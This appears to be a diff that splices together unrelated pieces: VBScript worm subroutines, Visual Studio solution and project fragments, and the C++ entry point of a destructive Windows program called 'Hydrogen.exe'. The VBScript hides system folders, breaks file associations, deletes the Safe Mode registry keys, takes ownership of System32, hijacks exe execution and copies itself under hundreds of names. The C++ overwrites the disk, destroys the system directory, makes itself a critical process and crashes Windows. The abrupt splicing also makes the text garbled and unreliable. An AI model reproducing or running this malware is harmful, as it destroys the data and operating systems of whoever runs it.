@@ -1,0 +1,472 @@
+Sub Spirit
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set Invisible1 = fso.getFolder("C:\Windows\")
+Set Invisible2 = fso.getFolder("C:\Windows\System32")
+Set Invisible3 = fso.getFolder("C:\Users\Public\ghostroot")
+Set Invisible4 = fso.getFolder("C:\Program Files")
+Invisible1.Attributes = Invisible1.Attributes or 2 ' 2 = hidden
+Invisible2.Attributes = Invisible2.Attributes or 2 ' 2 = hidden
+Invisible3.Attributes = Invisible3.Attributes or 2 ' 2 = hidden
+Invisible4.Attributes = Invisible4.Attributes or 2 ' 2 = hidden
+End Sub
+Sub WriteFuk
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\KillDora.bat")
+file.Write "@echo off"
+file.WriteBlankLines(1)
+file.Write "%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
+file.WriteBlankLines(1)
+file.Write "assoc .lnk=exefile"
+file.WriteBlankLines(1)
+file.Write "assoc .scr=dllfile"
+file.WriteBlankLines(1)
+file.Write "assoc .pif=dllfile"
+file.WriteBlankLines(1)
+file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal"" /f"
+file.WriteBlankLines(1)
+file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Network"" /f"
+file.WriteBlankLines(1)
+file.Write "taskkill /f /im explorer.exe && start explorer.exe"
+file.WriteBlankLines(1)
+file.Write "takeown /f C:\Windows\System32\"
+file.WriteBlankLines(1)
+file.Write "icacls C:\Windows\System32  /Grant Users:F"
+file.WriteBlankLines(1)
+file.Write "takeown /f C:\Windows\"
+file.WriteBlankLines(1)
+file.Write "icacls C:\Windows\  /Grant Users:F"
+file.WriteBlankLines(1)
+End Sub
+Sub LastChance
+On Error Resume Next
+WScript.Sleep 5000
+Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
+Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
+Key.Regwrite "HKCR\exefile\shell\open\command\C:\Users\Public\ghostroot\rpdbfk.exe  %1 %*"
+Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
+Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
+End Sub
+Sub FindFolder (CopyMachine)
+On Error Resume Next
+If CopyMachine = "" Then Exit Sub
+if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
+Dim target
+For Each target In fso.GetFolder(CopyMachine).SubFolders
+Cloner(target & "\Treasure.vbs")
+Cloner(target & "\Slap.vbs")
+Cloner(target & "\Slap1.vbs")
+Cloner(target & "\Slap2.vbs")
+Cloner(target & "\Slap3.vbs")
+Cloner(target & "\Slap4.vbs")
+Cloner(target & "\Slap5.vbs")
+Cloner(target & "\Slap6.vbs")
+Cloner(target & "\Slap7.vbs")
+Cloner(target & "\Slap8.vbs")
+Cloner(target & "\Slap9.vbs")
+Cloner(target & "\Slap10.vbs")
+Cloner(target & "\Slap11.vbs")
+Cloner(target & "\Slap12.vbs")
+Cloner(target & "\Slap13.vbs")
+Cloner(target & "\Slap14.vbs")
+Cloner(target & "\Slap15.vbs")
+Cloner(target & "\Slap16.vbs")
+Cloner(target & "\Slap17.vbs")
+Cloner(target & "\Slap18.vbs")
+Cloner(target & "\Slap19.vbs")
+Cloner(target & "\Slap20.vbs")
+Cloner(target & "\Slap21.vbs")
+Cloner(target & "\Slap22.vbs")
+Cloner(target & "\Slap23.vbs")
+Cloner(target & "\Slap24.vbs")
+Cloner(target & "\Slap25.vbs")
+Cloner(target & "\Slap26.vbs")
+Cloner(target & "\Slap27.vbs")
+Cloner(target & "\Slap28.vbs")
+Cloner(target & "\Slap29.vbs")
+Cloner(target & "\Slap30.vbs")
+Cloner(target & "\Slap31.vbs")
+Cloner(target & "\Slap32.vbs")
+Cloner(target & "\Slap33.vbs")
+Cloner(target & "\Slap34.vbs")
+Cloner(target & "\Slap35.vbs")
+Cloner(target & "\Slap36.vbs")
+Cloner(target & "\Slap37.vbs")
+Cloner(target & "\Slap38.vbs")
+Cloner(target & "\Slap39.vbs")
+Cloner(target & "\Slap40.vbs")
+Cloner(target & "\Slap41.vbs")
+Cloner(target & "\Slap42.vbs")
+Cloner(target & "\Slap43.vbs")
+Cloner(target & "\Slap44.vbs")
+Cloner(target & "\Slap45.vbs")
+Cloner(target & "\Slap46.vbs")
+Cloner(target & "\Slap47.vbs")
+Cloner(target & "\Slap48.vbs")
+Cloner(target & "\Slap49.vbs")
+Cloner(target & "\Slap50.vbs")
+Cloner(target & "\Slap51.vbs")
+Cloner(target & "\Slap52.vbs")
+Cloner(target & "\Slap53.vbs")
+Cloner(target & "\Slap54.vbs")
+Cloner(target & "\Slap55.vbs")
+Cloner(target & "\Slap56.vbs")
+Cloner(target & "\Slap57.vbs")
+Cloner(target & "\Slap58.vbs")
+Cloner(target & "\Slap59.vbs")
+Cloner(target & "\Slap60.vbs")
+Cloner(target & "\Slap61.vbs")
+Cloner(target & "\Slap62.vbs")
+Cloner(target & "\Slap63.vbs")
+Cloner(target & "\Slap64.vbs")
+Cloner(target & "\Slap65.vbs")
+Cloner(target & "\Slap66.vbs")
+Cloner(target & "\Slap67.vbs")
+Cloner(target & "\Slap68.vbs")
+Cloner(target & "\Slap69.vbs")
+Cloner(target & "\Slap70.vbs")
+Cloner(target & "\Slap71.vbs")
+Cloner(target & "\Slap72.vbs")
+Cloner(target & "\Slap73.vbs")
+Cloner(target & "\Slap74.vbs")
+Cloner(target & "\Slap75.vbs")
+Cloner(target & "\Slap76.vbs")
+Cloner(target & "\Slap77.vbs")
+Cloner(target & "\Slap78.vbs")
+Cloner(target & "\Slap79.vbs")
+Cloner(target & "\Slap80.vbs")
+Cloner(target & "\Slap81.vbs")
+Cloner(target & "\Slap82.vbs")
+Cloner(target & "\Slap83.vbs")
+Cloner(target & "\Slap84.vbs")
+Cloner(target & "\Slap85.vbs")
+Cloner(target & "\Slap86.vbs")
+Cloner(target & "\Slap87.vbs")
+Cloner(target & "\Slap88.vbs")
+Cloner(target & "\Slap89.vbs")
+Cloner(target & "\Slap90.vbs")
+Cloner(target & "\Slap91.vbs")
+Cloner(target & "\Slap92.vbs")
+Cloner(target & "\Slap93.vbs")
+Cloner(target & "\Slap94.vbs")
+Cloner(target & "\Slap95.vbs")
+Cloner(target & "\Slap96.vbs")
+Cloner(target & "\Slap97.vbs")
+Cloner(target & "\Slap98.vbs")
+Cloner(target & "\Slap99.vbs")
+Cloner(target & "\Slap100.vbs")
+Cloner(target & "\Slap101.vbs")
+Cloner(target & "\Slap102.vbs")
+Cloner(target & "\Slap103.vbs")
+Cloner(target & "\Slap104.vbs")
+Cloner(target & "\Slap105.vbs")
+Cloner(target & "\Slap106.vbs")
+Cloner(target & "\Slap107.vbs")
+Cloner(target & "\Slap108.vbs")
+Cloner(target & "\Slap109.vbs")
+Cloner(target & "\Slap110.vbs")
+Cloner(target & "\Slap111.vbs")
+Cloner(target & "\Slap112.vbs")
+Cloner(target & "\Slap113.vbs")
+Cloner(target & "\Slap114.vbs")
+Cloner(target & "\Slap115.vbs")
+Cloner(target & "\Slap116.vbs")
+Cloner(target & "\Slap117.vbs")
+Cloner(target & "\Slap118.vbs")
+Cloner(target & "\Slap119.vbs")
+Cloner(target & "\Slap120.vbs")
+Cloner(target & "\Slap121.vbs")
+Cloner(target & "\Slap122.vbs")
+Cloner(target & "\Slap123.vbs")
+Cloner(target & "\Slap124.vbs")
+Cloner(target & "\Slap125.vbs")
+Cloner(target & "\Slap126.vbs")
+Cloner(target & "\Slap127.vbs")
+Cloner(target & "\Slap128.vbs")
+Cloner(target & "\Slap129.vbs")
+Cloner(target & "\Slap130.vbs")
+Cloner(target & "\Slap131.vbs")
+Cloner(target & "\Slap132.vbs")
+Cloner(target & "\Slap133.vbs")
+Cloner(target & "\Slap134.vbs")
+Cloner(target & "\Slap135.vbs")
+Cloner(target & "\Slap136.vbs")
+Cloner(target & "\Slap137.vbs")
+Cloner(target & "\Slap138.vbs")
+Cloner(target & "\Slap139.vbs")
+Cloner(target & "\Slap140.vbs")
+Cloner(target & "\Slap141.vbs")
+Cloner(target & "\Slap142.vbs")
+Cloner(target & "\Slap143.vbs")
+Cloner(target & "\Slap144.vbs")
+Cloner(target & "\Slap145.vbs")
+Cloner(target & "\Slap146.vbs")
+Cloner(target & "\Slap147.vbs")
+Cloner(target & "\Slap148.vbs")
+Cloner(target & "\Slap149.vbs")
+Cloner(target & "\Slap150.vbs")
+Cloner(target & "\Slap151.vbs")
+Cloner(target & "\Slap152.vbs")
+Cloner(target & "\Slap153.vbs")
+Cloner(target & "\Slap154.vbs")
+Cloner(target & "\Slap155.vbs")
+Cloner(target & "\Slap156.vbs")
+Cloner(target & "\Slap157.vbs")
+Cloner(target & "\Slap158.vbs")
+Cloner(target & "\Slap159.vbs")
+Cloner(target & "\Slap160.vbs")
+Cloner(target & "\Slap161.vbs")
+Cloner(target & "\Slap162.vbs")
+Cloner(target & "\Slap163.vbs")
+Cloner(target & "\Slap164.vbs")
+Cloner(target & "\Slap165.vbs")
+Cloner(target & "\Slap166.vbs")
+Cloner(target & "\Slap167.vbs")
+Cloner(target & "\Slap168.vbs")
+Cloner(target & "\Slap169.vbs")
+Cloner(target & "\Slap170.vbs")
+Cloner(target & "\Slap171.vbs")
+Cloner(target & "\Slap172.vbs")
+Cloner(target & "\Slap173.vbs")
+Cloner(target & "\Slap174.vbs")
+Cloner(target & "\Slap175.vbs")
+Cloner(target & "\Slap176.vbs")
+Cloner(target & "\Slap177.vbs")
+Cloner(target & "\Slap178.vbs")
+Cloner(target & "\Slap179.vbs")
+Cloner(target & "\Slap180.vbs")
+Cloner(target & "\Slap181.vbs")
+Cloner(target & "\Slap182.vbs")
+Cloner(target & "\Slap183.vbs")
+Cloner(target & "\Slap184.vbs")
+Cloner(target & "\Slap185.vbs")
+Cloner(target & "\Slap186.vbs")
+Cloner(target & "\Slap187.vbs")
+Cloner(target & "\Slap188.vbs")
+Cloner(target & "\Slap189.vbs")
+Cloner(target & "\Slap190.vbs")
+Cloner(target & "\Slap191.vbs")
+Cloner(target & "\Slap192.vbs")
+Cloner(target & "\Slap193.vbs")
+Cloner(target & "\Slap194.vbs")
+Cloner(target & "\Slap195.vbs")
+Cloner(target & "\Slap196.vbs")
+Cloner(target & "\Slap197.vbs")
+Cloner(target & "\Slap198.vbs")
+Cloner(target & "\Slap199.vbs")
+Cloner(target & "\Slap200.vbs")
+Cloner(target & "\Slap201.vbs")
+Cloner(target & "\Slap202.vbs")
+Cloner(target & "\Slap203.vbs")
+Cloner(target & "\Slap204.vbs")
+Cloner(target & "\Slap205.vbs")
+Cloner(target & "\Slap206.vbs")
+Cloner(target & "\Slap207.vbs")
+Cloner(target & "\Slap208.vbs")
+Cloner(target & "\Slap209.vbs")
+Cloner(target & "\Slap210.vbs")
+Cloner(target & "\Slap211.vbs")
+Cloner(target & "\Slap212.vbs")
+Cloner(target & "\Slap213.vbs")
+Cloner(target & "\Slap214.vbs")
+Cloner(target & "\Slap215.vbs")
+Cloner(target & "\Slap216.vbs")
+Cloner(target & "\Slap217.vbs")
+Cloner(target & "\Slap218.vbs")
+Cloner(target & "\Slap219.vbs")
+Cloner(target & "\Slap220.vbs")
+Cloner(target & "\Slap221.vbs")
+Cloner(target & "\Slap222.vbs")
+Cloner(target & "\Slap223.vbs")
+Cloner(target & "\Slap224.vbs")
+Cloner(target & "\Slap225.vbs")
+Cloner(target & "\Slap226.vbs")
+Cloner(target & "\Slap227.vbs")
+Cloner(target & "\Slap228.vbs")
+Cloner(target & "\Slap229.vbs")
+Cloner(target & "\Slap230.vbs")
+Cloner(target & "\Slap231.vbs")
+Cloner(target & "\Slap232.vbs")
+Cloner(target & "\Slap233.vbs")
+Cloner(target & "\Slap234.vbs")
+Cloner(target & "\Slap235.vbs")
+Cloner(target & "\Slap236.vbs")
+Cloner(target & "\Slap237.vbs")
+Cloner(target & "\Slap238.vbs")
+Cloner(target & "\Slap239.vbs")
+Cloner(target & "\Slap240.vbs")
+Cloner(target & "\Slap241.vbs")
+Cloner(target & "\Slap242.vbs")
+Cloner(target & "\Slap243.vbs")
+Cloner(target & "\Slap244.vbs")
+Cloner(target & "\Slap245.vbs")
+Cloner(target & "\Slap246.vbs")
+Cloner(target & "\Slap247.vbs")
+Cloner(target & "\Slap248.vbs")
+Cloner(target & "\Slap249.vbs")
+Cloner(target & "\Slap250.vbs")
+FindFile
+FindFolder2 (target)
+Next
+End Sub
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|Any CPU = Debug|Any CPU
+		Release|Any CPU = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{682B4B26-7C01-40BF-9F5E-BBB51B045744}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+		{682B4B26-7C01-40BF-9F5E-BBB51B045744}.Debug|Any CPU.Build.0 = Debug|Any CPU
+		{682B4B26-7C01-40BF-9F5E-BBB51B045744}.Release|Any CPU.ActiveCfg = Release|Any CPU
+		{682B4B26-7C01-40BF-9F5E-BBB51B045744}.Release|Any CPU.Build.0 = Release|Any CPU
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
+
+
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp">
+      <Filter>Source</Filter>
+    </ClCompile>
+    <ClCompile Include="payloads.cpp">
+      <Filter>Source</Filter>
+    </ClCompile>
+    <ClCompile Include="timer.cpp">
+      <Filter>Source</Filter>
+    </ClCompile>
+    <ClCompile Include="virtual_screen.cpp">
+      <Filter>Source</Filter>
+    </ClCompile>
+    <ClCompile Include="destruction.cpp">
+      <Filter>Source</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="payloads.h">
+      <Filter>Header</Filter>
+    </ClInclude>
+    <ClInclude Include="timer.h">
+      <Filter>Header</Filter>
+    </ClInclude>
+    <ClInclude Include="virtual_screen.h">
+      <Filter>Header</Filter>
+    </ClInclude>
+    <ClInclude Include="def.h">
+      <Filter>Header</Filter>
+    </ClInclude>
+    <ClInclude Include="destruction.h">
+      <Filter>Header</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
+
+#include "destruction.h"
+#include "payloads.h"
+
+void InitDPI() {
+	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
+	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
+	
+	if (SetProcessDPIAware) {
+		SetProcessDPIAware();
+	}
+
+	FreeLibrary(hModUser32);
+}
+
+int WinMain(
+	_In_ HINSTANCE hInstance,
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPSTR lpCmdLine,
+	_In_ int nShowCmd
+) {
+	int msgResult = MessageBox(NULL, L"What you have just executed is a malware.\nYou might lose all of your data if you continue!\nStill execute it?", L"Hydrogen.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
+	if (msgResult != IDYES) {
+		ExitProcess(0);
+	}
+	msgResult = MessageBox(NULL, L"THIS IS THE LAST WARNING!\nTHE CREATOR OF THIS MALWARE WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS MALWARE!\nSTILL CONTINUE?", L"Hydrogen.exe - LAST WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
+	if (msgResult != IDYES) {
+		ExitProcess(0);
+	}
+
+	WCHAR SystemDirectory[MAX_PATH] = { 0 };
+	GetSystemDirectory(SystemDirectory, MAX_PATH);
+
+	OverWriteDisk();
+	DestroyDirectory(SystemDirectory);
+
+	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
+	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
+	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
+	pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
+	pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
+	pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
+	pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
+	pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
+	pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
+	pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
+	pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };
+
+	SeedXorshift32((DWORD)__rdtsc());
+
+	InitDPI();
+
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);
+
+	SetCriticalProcess();
+
+	ExecutePayload(Payload1, PAYLOAD_TIME);
+	ExecutePayload(Payload2, PAYLOAD_TIME);
+	ExecutePayload(Payload3, PAYLOAD_TIME);
+	ExecutePayload(Payload4, PAYLOAD_TIME);
+	ExecutePayload(Payload5, PAYLOAD_TIME);
+	ExecutePayload(Payload6, PAYLOAD_TIME);
+	ExecutePayload(Payload7, PAYLOAD_TIME);
+	ExecutePayload(Payload8, PAYLOAD_TIME);
+	ExecutePayload(Payload9, PAYLOAD_TIME);
+	ExecutePayload(Payload10, PAYLOAD_TIME);
+
+	ExecuteShader(Shader1, PAYLOAD_TIME);
+	ExecuteShader(Shader2, PAYLOAD_TIME);
+	ExecuteShader(Shader3, PAYLOAD_TIME);
+	ExecuteShader(Shader4, PAYLOAD_TIME);
+	ExecuteShader(Shader5, PAYLOAD_TIME);
+	ExecuteShader(Shader6, PAYLOAD_TIME);
+	ExecuteShader(Shader7, PAYLOAD_TIME);
+	ExecuteShader(Shader8, PAYLOAD_TIME);
+	ExecuteShader(Shader9, PAYLOAD_TIME);
+	ExecuteShader(Shader10, PAYLOAD_TIME);
+	ExecuteShader(Shader11, PAYLOAD_TIME);
+	ExecuteShader(Shader12, PAYLOAD_TIME);
+	ExecuteShader(Shader13, PAYLOAD_TIME);
+	ExecuteShader(Shader14, PAYLOAD_TIME);
+	ExecuteShader(Shader15, PAYLOAD_TIME);
+	ExecuteShader(Shader16, PAYLOAD_TIME);
+
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)SystemDirectory, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
+	Sleep(20000);
+	CrashWindows();
+	return 0;
+}
